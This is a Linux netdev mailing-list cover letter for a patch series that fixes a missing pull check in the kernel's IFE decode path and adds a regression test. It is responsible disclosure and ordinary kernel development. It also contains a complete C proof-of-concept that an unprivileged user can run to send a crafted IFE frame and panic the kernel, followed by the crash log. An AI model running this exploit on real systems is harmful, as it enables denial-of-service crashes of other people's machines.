Return-Path: <netdev+bounces-296692-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id yFsjJNIMJ2o/qwIAu9opvQ
	(envelope-from <netdev+bounces-296692-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Mon, 08 Jun 2026 20:41:22 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from tor.lore.kernel.org (tor.lore.kernel.org [172.105.105.114])
	by mail.lfdr.de (Postfix) with ESMTPS id 561EE659CD4
	for <lists+netdev@lfdr.de>; Mon, 08 Jun 2026 20:41:21 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=none;
	dmarc=none;
	spf=pass (mail.lfdr.de: domain of "netdev+bounces-296692-lists+netdev=lfdr.de@vger.kernel.org" designates 172.105.105.114 as permitted sender) smtp.mailfrom="netdev+bounces-296692-lists+netdev=lfdr.de@vger.kernel.org";
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by tor.lore.kernel.org (Postfix) with ESMTP id 6079530ED457
	for <lists+netdev@lfdr.de>; Mon,  8 Jun 2026 18:35:23 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 1497B3E3DBE;
	Mon,  8 Jun 2026 18:34:48 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from azure-sdnproxy.icoremail.net (azure-sdnproxy.icoremail.net [207.46.229.174])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 50C163E120D
	for <netdev@vger.kernel.org>; Mon,  8 Jun 2026 18:34:43 +0000 (UTC)
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780943688; cv=none; b=FUo7cP6LV/slpLCi7NfBj30BwXyAQ1Y6vHzhmp9C6wrnmC44qUwP5uzpNBniq/0W+bDh59DqwsP5RLNpizoaHtXhgIyaDPOTfsiz8mXT0/dhtIzUcrqlTAC4mUJR5y80redemDhw//t1unF74LshDi3UID25GwGEkRWek+fTaLc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780943688; c=relaxed/simple;
	bh=swBU2y7oAEVJTxfDCPRgACDfIlc8FQB4ZOuuEZl14Z0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=N9Od6eXg/KHEfr/u5MO2YQ5idphxE4rfKmzit/1jEmPRUZ+QSKsOYGiddB8Y6a2JsMo/4FJuxceNJs6GglohnDR8Ke6CyOWvmjW5+kQmAEsKIN3W4KvrZIa+lKbYOe++sN0RwlG+3FkYZODxWngCfvPEEIbDrBCkjcJh3PiOYR4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=lzu.edu.cn; spf=pass smtp.mailfrom=lzu.edu.cn; arc=none smtp.client-ip=207.46.229.174
Received: from enjou-Legion-Y7000P-2019 (unknown [172.23.56.36])
	by app1 (Coremail) with SMTP id ygmowADH6sQ4CydqRBRuAA--.16762S2;
	Tue, 09 Jun 2026 02:34:32 +0800 (CST)
From: Ren Wei <n05ec@lzu.edu.cn>
To: netdev@vger.kernel.org
Cc: kuba@kernel.org,
	victor@mojatatu.com,
	jhs@mojatatu.com,
	yotam.gi@gmail.com,
	davem@davemloft.net,
	xiyou.wangcong@gmail.com,
	yuantan098@gmail.com,
	bird@lzu.edu.cn,
	edragain@163.com,
	n05ec@lzu.edu.cn
Subject: [PATCH net v2 0/2] net: ife: fix decode header pull handling and add selftest
Date: Tue,  9 Jun 2026 02:34:21 +0800
Message-ID: <cover.1780901080.git.edragain@163.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:ygmowADH6sQ4CydqRBRuAA--.16762S2
X-Coremail-Antispam: 1UD129KBjvAXoWfJr4DXFy3Jry5Ar4rKFy7trb_yoW8WrW3Zo
	Z8Aw48CFZ3WwnrAw18AwnrGryUWF1FyFZ7Gr1rCa1DCFn2va4DJrn7Aw1xG3sFg3yFqFyf
	Ar1Dt347Jw1rWF97n29KB7ZKAUJUUUU8529EdanIXcx71UUUUU7v73VFW2AGmfu7bjvjm3
	AaLaJ3UjIYCTnIWjp_UUUYX7CY07I20VC2zVCF04k26cxKx2IYs7xG6rWj6s0DM7CIcVAF
	z4kK6r1j6r18M28lY4IEw2IIxxk0rwA2F7IY1VAKz4vEj48ve4kI8wA2z4x0Y4vE2Ix0cI
	8IcVAFwI0_Jr0_JF4l84ACjcxK6xIIjxv20xvEc7CjxVAFwI0_Gr0_Cr1l84ACjcxK6I8E
	87Iv67AKxVWxJVW8Jr1l84ACjcxK6I8E87Iv6xkF7I0E14v26r4j6r4UJwAS0I0E0xvYzx
	vE52x082IY62kv0487Mc02F40EFcxC0VAKzVAqx4xG6I80ewAv7VC0I7IYx2IY67AKxVWU
	JVWUGwAv7VC2z280aVAFwI0_Jr0_Gr1lOx8S6xCaFVCjc4AY6r1j6r4UM4x0Y48IcxkI7V
	AKI48JM4x0x7Aq67IIx4CEVc8vx2IErcIFxwACI402YVCY1x02628vn2kIc2xKxwCY1x02
	62kKe7AKxVWUtVW8ZwCY02Avz4vE-syl42xK82IYc2Ij64vIr41l42xK82IY6x8ErcxFaV
	Av8VW8GwCFx2IqxVCFs4IE7xkEbVWUJVW8JwC20s026c02F40E14v26r1j6r18MI8I3I0E
	7480Y4vE14v26r106r1rMI8E67AF67kF1VAFwI0_Jw0_GFylIxkGc2Ij64vIr41lIxAIcV
	C0I7IYx2IY67AKxVWUJVWUCwCI42IY6xIIjxv20xvEc7CjxVAFwI0_Gr0_Cr1lIxAIcVCF
	04k26cxKx2IYs7xG6r1j6r1xMIIF0xvEx4A2jsIE14v26r1j6r4UMIIF0xvEx4A2jsIEc7
	CjxVAFwI0_Gr0_Gr1UYxBIdaVFxhVjvjDU0xZFpf9x0JUd-B_UUUUU=
X-CM-SenderInfo: zqqvvuo6o23hxhgxhubq/1tbiAQEMCWome1AJhAADss
X-Rspamd-Action: no action
X-Spamd-Result: default: False [0.54 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	R_MISSING_CHARSET(0.50)[];
	R_SPF_ALLOW(-0.20)[+ip4:172.105.105.114:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	DMARC_NA(0.00)[lzu.edu.cn];
	TAGGED_FROM(0.00)[bounces-296692-lists,netdev=lfdr.de];
	PRECEDENCE_BULK(0.00)[];
	FORGED_RECIPIENTS(0.00)[m:netdev@vger.kernel.org,m:kuba@kernel.org,m:victor@mojatatu.com,m:jhs@mojatatu.com,m:yotam.gi@gmail.com,m:davem@davemloft.net,m:xiyou.wangcong@gmail.com,m:yuantan098@gmail.com,m:bird@lzu.edu.cn,m:edragain@163.com,m:n05ec@lzu.edu.cn,m:yotamgi@gmail.com,m:xiyouwangcong@gmail.com,s:lists@lfdr.de];
	RCVD_COUNT_THREE(0.00)[4];
	FORWARDED(0.00)[lists@lfdr.de];
	FROM_HAS_DN(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	FORGED_SENDER(0.00)[n05ec@lzu.edu.cn,netdev@vger.kernel.org];
	FREEMAIL_CC(0.00)[kernel.org,mojatatu.com,gmail.com,davemloft.net,lzu.edu.cn,163.com];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[n05ec@lzu.edu.cn,netdev@vger.kernel.org];
	ALIAS_RESOLVED(0.00)[];
	TO_DN_NONE(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	R_DKIM_NA(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	RCPT_COUNT_SEVEN(0.00)[11];
	ASN(0.00)[asn:63949, ipnet:172.105.96.0/20, country:SG];
	MIME_TRACE(0.00)[0:+];
	DBL_BLOCKED_OPENRESOLVER(0.00)[tor.lore.kernel.org:rdns,tor.lore.kernel.org:helo,vger.kernel.org:from_smtp,lzu.edu.cn:from_mime]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: 561EE659CD4

From: Yong Wang <edragain@163.com>

We found and validated an issue in the IFE decode path. The bug is
reachable by a non-root user via user and net namespaces. We tested
both the fix and a tc-testing regression testcase for it.

Following maintainer feedback on the previous round, this version keeps
the tc-testing reproducer in the series. The tc-testing coverage in
this round was prepared independently in response to that suggestion.
If Victor's testcase version is preferable, please feel free to pick up
Victor's version instead, as we are not experts in this area.

We provide detailed information about the bug in this email, along with
both the standalone PoC and the tc-testing reproducer.

---- details below ----

Bug details:

tcf_ife_decode() decapsulates an incoming IFE packet and then passes the
inner frame to eth_type_trans(). However, the decode path does not
ensure that the decapsulated inner Ethernet header is pullable before
calling eth_type_trans().

More specifically, ife_decode() only guarantees that the outer IFE
header area is pullable. After it advances skb->data past the outer
Ethernet header and IFE metadata, the inner Ethernet header may still be
shorter than ETH_HLEN in the linear area, or may reside entirely in
non-linear fragments. In that state, tcf_ife_decode() immediately calls:

    skb->protocol = eth_type_trans(skb, skb->dev);

eth_type_trans() assumes that an Ethernet header is safely accessible
from the skb head and eventually reaches eth_skb_pull_mac(). With a
crafted IFE frame, this can trigger a BUG in the skb pull path and panic
the kernel.

The fix is to extend the pull check in ife_decode() so that the
decapsulated inner Ethernet header is also guaranteed to be pullable
before the helper returns to the action code.

Reproducer:

The issue can be reproduced with the added tc-testing testcase:

    ./tdc.py -f tc-tests/actions/ife.json -e 8a7c -v

The testcase also extends scapyPlugin with an optional mtu field.
This is needed because nsPlugin places DEV0 in the root namespace,
while testcase setup commands are executed inside the test namespace.
Without this, the testcase cannot raise DEV0's MTU before sendp()
transmits the larger malformed IFE frame.

For reference, we also validated the issue with the standalone PoC
below:

    gcc -O2 -static -o poc_ife_pkt poc.c
    unshare -Urn ./poc_ife_pkt

We run the tests in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void run_cmd(const char *cmd)
{
	int ret = system(cmd);

	if (ret != 0) {
		fprintf(stderr, "command failed (%d): %s\n", ret, cmd);
		exit(1);
	}
}

static int get_ifindex(int fd, const char *ifname)
{
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("SIOCGIFINDEX");

	return ifr.ifr_ifindex;
}

static void get_hwaddr(int fd, const char *ifname, unsigned char *addr)
{
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die("SIOCGIFHWADDR");

	memcpy(addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
}

static void setup_ns(void)
{
	run_cmd("/usr/sbin/ip link add veth0 type veth peer name veth1");
	run_cmd("/usr/sbin/ip link set dev veth0 mtu 65535");
	run_cmd("/usr/sbin/ip link set dev veth1 mtu 65535");
	run_cmd("/usr/sbin/ip link set dev veth0 up");
	run_cmd("/usr/sbin/ip link set dev veth1 up");
	run_cmd("/usr/sbin/tc qdisc add dev veth1 clsact");
	run_cmd("/usr/sbin/tc filter add dev veth1 ingress protocol 0xed3e "
		"flower action ife decode pipe");
}

static void hexdump(const void *buf, size_t len)
{
	const unsigned char *p = buf;
	size_t i;

	for (i = 0; i < len; i++) {
		fprintf(stderr, "%02x", p[i]);
		if ((i & 15) == 15 || i + 1 == len)
			fprintf(stderr, "\n");
		else
			fputc(' ', stderr);
	}
}

int main(void)
{
	const char *tx = "veth0";
	const char *rx = "veth1";
	const size_t total = 5000;
	int fd;
	int ifindex;
	unsigned char src[ETH_ALEN];
	unsigned char dst[ETH_ALEN];
	unsigned char *buf;
	struct sockaddr_ll sll;
	ssize_t n;

	setup_ns();

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IFE));
	if (fd < 0)
		die("socket(AF_PACKET)");

	ifindex = get_ifindex(fd, tx);
	get_hwaddr(fd, tx, src);
	get_hwaddr(fd, rx, dst);

	buf = malloc(total);
	if (!buf)
		die("malloc");
	memset(buf, 0xdd, total);

	memcpy(buf + 0, dst, ETH_ALEN);
	memcpy(buf + 6, src, ETH_ALEN);
	buf[12] = 0xed;
	buf[13] = 0x3e;
	buf[14] = 0x00;
	buf[15] = 0x02;

	memset(buf + 16, 0xcc, ETH_HLEN);

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IFE);
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst, ETH_ALEN);

	fprintf(stderr, "sending %zu-byte packet on %s -> %s\n", total, tx, rx);
	fprintf(stderr,
		"src %02x:%02x:%02x:%02x:%02x:%02x dst %02x:%02x:%02x:%02x:%02x:%02x\n",
		src[0], src[1], src[2], src[3], src[4], src[5],
		dst[0], dst[1], dst[2], dst[3], dst[4], dst[5]);
	hexdump(buf, 32);

	n = sendto(fd, buf, total, 0, (struct sockaddr *)&sll, sizeof(sll));
	if (n < 0)
		die("sendto");

	fprintf(stderr, "sendto sent %zd bytes\n", n);
	sleep(1);
	return 0;
}

------END poc.c--------

The crash log below was collected while running the tc-testing testcase
above.

----BEGIN crash log----

[  374.925830][    C0] kernel BUG at include/linux/skbuff.h:2848!
[  374.926337][    C0] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[  374.926889][    C0] CPU: 0 UID: 0 PID: 12821 Comm: python3 Not tainted 7.1.0-rc6-00189-gf988cd8a9bbf-dirty #1 PREEMPT(full) 
[  374.927828][    C0] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  374.928574][    C0] RIP: 0010:eth_type_trans+0x54f/0x750
[  374.929067][    C0] Code: e8 51 f8 44 89 75 70 be 0e 00 00 00 48 c7 c7 00 69 d9 8c e8 13 a9 2f f8 31 d2 48 89 ee 48 c7 c7 40 69 d9 8c e8 62 10 d7 ff 90 <0f> 0b 41 bc 00 01 00 00 e9 1d ff ff ff 48 8b 7c 24 28 e8 5a 81 bd
[  374.930658][    C0] RSP: 0018:ffffc90000007320 EFLAGS: 00010246
[  374.931175][    C0] RAX: 0000000000000000 RBX: ffff888050719000 RCX: ffffffff8944cb79
[  374.931845][    C0] RDX: ffff8880253e25c0 RSI: ffffffff896dacae RDI: 0000000000000001
[  374.932504][    C0] RBP: ffff8880213f43c0 R08: 0000000000000130 R09: 0000000000000000
[  374.933169][    C0] R10: 0000000000000000 R11: 000000000000000a R12: 0000000000000012
[  374.933831][    C0] R13: ffff88803853bc52 R14: 0000000000001378 R15: 0000000000000012
[  374.934496][    C0] FS:  00007f0383ee3740(0000) GS:ffff8880d6988000(0000) knlGS:0000000000000000
[  374.935242][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  374.935802][    C0] CR2: 00007f0383dd4370 CR3: 0000000064ee2000 CR4: 0000000000750ef0
[  374.936462][    C0] PKRU: 55555554
[  374.936771][    C0] Call Trace:
[  374.937053][    C0]  <IRQ>
[  374.937302][    C0]  tcf_ife_act+0x69f/0x1d00
[  374.937712][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.938198][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.938683][    C0]  ? find_held_lock+0x2b/0x80
[  374.939097][    C0]  ? __pfx_tcf_ife_act+0x10/0x10
[  374.939535][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.940024][    C0]  ? __pfx_tcf_ife_act+0x10/0x10
[  374.940459][    C0]  tcf_action_exec+0x936/0xa30
[  374.940885][    C0]  fl_classify+0x5a4/0x6f0
[  374.941277][    C0]  ? __pfx_fl_classify+0x10/0x10
[  374.941710][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.942190][    C0]  ? __lock_acquire+0x47d/0x2740
[  374.942628][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.943114][    C0]  ? __lock_acquire+0x47d/0x2740
[  374.943546][    C0]  ? __lock_acquire+0x3f2/0x2740
[  374.943986][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.944468][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.944958][    C0]  ? __lock_acquire+0x47d/0x2740
[  374.945396][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.945888][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.946373][    C0]  ? find_held_lock+0x2b/0x80
[  374.946782][    C0]  ? clockevents_program_event+0x27c/0x990
[  374.947284][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.947781][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.948259][    C0]  ? __lock_acquire+0x47d/0x2740
[  374.948694][    C0]  ? __pfx_fl_classify+0x10/0x10
[  374.949124][    C0]  tcf_classify+0x1090/0x1370
[  374.949536][    C0]  tc_run+0x46e/0x760
[  374.949898][    C0]  ? __pfx_tc_run+0x10/0x10
[  374.950297][    C0]  ? qdisc_pkt_len_segs_init+0x535/0xb30
[  374.950787][    C0]  __netif_receive_skb_core.constprop.0+0x10ac/0x3320
[  374.951356][    C0]  ? try_to_wake_up+0xa0d/0x18d0
[  374.951787][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.952271][    C0]  ? do_raw_spin_unlock+0x147/0x1f0
[  374.952722][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.953204][    C0]  ? _raw_spin_unlock_irqrestore+0x41/0x70
[  374.953714][    C0]  ? __pfx___netif_receive_skb_core.constprop.0+0x10/0x10
[  374.954313][    C0]  ? __pfx_try_to_wake_up+0x10/0x10
[  374.954770][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.955253][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.955741][    C0]  ? __css_rstat_updated+0x1c0/0x570
[  374.956208][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.956717][    C0]  ? __lock_acquire+0x47d/0x2740
[  374.957160][    C0]  __netif_receive_skb_one_core+0xaf/0x1e0
[  374.957663][    C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  374.958225][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.958718][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.959203][    C0]  ? process_backlog+0x330/0x1540
[  374.959635][    C0]  ? process_backlog+0x330/0x1540
[  374.960078][    C0]  __netif_receive_skb+0x1d/0x160
[  374.960513][    C0]  process_backlog+0x382/0x1540
[  374.960943][    C0]  __napi_poll.constprop.0+0xb3/0x540
[  374.961406][    C0]  net_rx_action+0x9b1/0xea0
[  374.961812][    C0]  ? __pfx_net_rx_action+0x10/0x10
[  374.962251][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.962740][    C0]  ? sched_clock+0x37/0x60
[  374.963126][    C0]  ? sched_clock_cpu+0x6c/0x550
[  374.963552][    C0]  ? __pfx_sched_clock_cpu+0x10/0x10
[  374.964019][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.964507][    C0]  ? sched_clock_cpu+0x6c/0x550
[  374.964941][    C0]  ? __dev_queue_xmit+0xe10/0x4310
[  374.965383][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.965876][    C0]  ? rcu_is_watching+0x12/0xc0
[  374.966294][    C0]  handle_softirqs+0x1d4/0x9d0
[  374.966727][    C0]  ? __dev_queue_xmit+0xe10/0x4310
[  374.967168][    C0]  do_softirq+0xac/0xe0
[  374.967542][    C0]  </IRQ>
[  374.967803][    C0]  <TASK>
[  374.968058][    C0]  __local_bh_enable_ip+0x100/0x120
[  374.968518][    C0]  ? __dev_queue_xmit+0xe10/0x4310
[  374.968964][    C0]  __dev_queue_xmit+0xe25/0x4310
[  374.969394][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.969888][    C0]  ? __might_fault+0xe0/0x190
[  374.970308][    C0]  ? __pfx___dev_queue_xmit+0x10/0x10
[  374.970785][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.971267][    C0]  ? _copy_from_iter+0x14b/0x1710
[  374.971715][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.972198][    C0]  ? _copy_from_iter+0x14b/0x1710
[  374.972637][    C0]  ? __pfx__copy_from_iter+0x10/0x10
[  374.973124][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.973607][    C0]  ? __pfx__copy_from_iter+0x10/0x10
[  374.974074][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.974555][    C0]  ? packet_parse_headers+0x43d/0x7f0
[  374.975022][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.975505][    C0]  ? packet_parse_headers+0x1ef/0x7f0
[  374.975968][    C0]  ? __pfx_packet_parse_headers+0x10/0x10
[  374.976455][    C0]  packet_xmit+0x247/0x370
[  374.976850][    C0]  packet_sendmsg+0x2f72/0x4ee0
[  374.977278][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.977771][    C0]  ? sock_has_perm+0x21f/0x2c0
[  374.978192][    C0]  ? __pfx_sock_has_perm+0x10/0x10
[  374.978636][    C0]  ? tomoyo_socket_sendmsg_permission+0x13b/0x3a0
[  374.979183][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  374.979641][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  374.980093][    C0]  __sys_sendto+0x4a4/0x4f0
[  374.980484][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.980978][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  374.981428][    C0]  ? count_memcg_events_mm.constprop.0+0xfa/0x2a0
[  374.981986][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.982469][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.982961][    C0]  ? exc_page_fault+0xbe/0x170
[  374.983382][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.983872][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.984354][    C0]  ? rcu_is_watching+0x12/0xc0
[  374.984777][    C0]  __x64_sys_sendto+0xe0/0x1c0
[  374.985190][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  374.985674][    C0]  ? lockdep_hardirqs_on+0x7c/0x110
[  374.986132][    C0]  do_syscall_64+0x11f/0x860
[  374.986540][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  374.987050][    C0] RIP: 0033:0x7f038426944c
[  374.987429][    C0] Code: 89 02 48 c7 c0 ff ff ff ff eb b5 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 19 45 31 c9 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 64 c3 0f 1f 00 55 48 83 ec 20 48 89 54 24 10
[  374.989008][    C0] RSP: 002b:00007ffc7eddc258 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  374.989707][    C0] RAX: ffffffffffffffda RBX: 00007ffc7eddc300 RCX: 00007f038426944c
[  374.990360][    C0] RDX: 0000000000001388 RSI: 000000000ba2ce70 RDI: 0000000000000003
[  374.991023][    C0] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  374.991680][    C0] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
[  374.992339][    C0] R13: ffffffffc4653600 R14: 00007ffc7eddc300 R15: 0000000000000001
[  374.993007][    C0]  </TASK>
[  374.993267][    C0] Modules linked in:
[  374.993628][    C0] ---[ end trace 0000000000000000 ]---
[  374.994106][    C0] RIP: 0010:eth_type_trans+0x54f/0x750
[  374.994586][    C0] Code: e8 51 f8 44 89 75 70 be 0e 00 00 00 48 c7 c7 00 69 d9 8c e8 13 a9 2f f8 31 d2 48 89 ee 48 c7 c7 40 69 d9 8c e8 62 10 d7 ff 90 <0f> 0b 41 bc 00 01 00 00 e9 1d ff ff ff 48 8b 7c 24 28 e8 5a 81 bd
[  374.996169][    C0] RSP: 0018:ffffc90000007320 EFLAGS: 00010246
[  374.996679][    C0] RAX: 0000000000000000 RBX: ffff888050719000 RCX: ffffffff8944cb79
[  374.997337][    C0] RDX: ffff8880253e25c0 RSI: ffffffff896dacae RDI: 0000000000000001
[  374.997998][    C0] RBP: ffff8880213f43c0 R08: 0000000000000130 R09: 0000000000000000
[  374.998647][    C0] R10: 0000000000000000 R11: 000000000000000a R12: 0000000000000012
[  374.999301][    C0] R13: ffff88803853bc52 R14: 0000000000001378 R15: 0000000000000012
[  374.999956][    C0] FS:  00007f0383ee3740(0000) GS:ffff8880d6988000(0000) knlGS:0000000000000000
[  375.000690][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  375.001235][    C0] CR2: 00007f0383dd4370 CR3: 0000000064ee2000 CR4: 0000000000750ef0
[  375.001897][    C0] PKRU: 55555554
[  375.002201][    C0] Kernel panic - not syncing: Fatal exception in interrupt
[  375.002933][    C0] Kernel Offset: disabled
[  375.003295][    C0] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Yong Wang

Yong Wang (2):
  selftests: tc-testing: cover malformed IFE decode frames
  net: ife: require ETH_HLEN to be pullable in ife_decode()

 net/ife/ife.c                                 |  2 +-
 .../tc-testing/plugin-lib/scapyPlugin.py      |  6 ++
 .../tc-testing/tc-tests/actions/ife.json      | 62 +++++++++++++++++++
 3 files changed, 69 insertions(+), 1 deletion(-)

-- 
2.34.1


